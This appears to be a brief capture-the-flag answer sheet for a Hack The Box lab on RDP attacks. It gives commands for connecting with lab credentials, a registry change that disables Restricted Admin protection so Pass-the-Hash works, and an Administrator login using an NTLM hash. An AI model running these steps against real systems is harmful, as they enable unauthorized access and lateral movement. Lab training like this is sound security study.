## What is the name of the file that was left on the Desktop? (Format example: filename.txt)
```
xfreerdp3 /u:htb-rdp /p:HTBRocks! /v:10.129.203.13
```


## Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol?
```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

## Connect via RDP with the Administrator account and submit the flag.txt as you answer.
```
xfreerdp3 /v:10.129.203.13 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824
```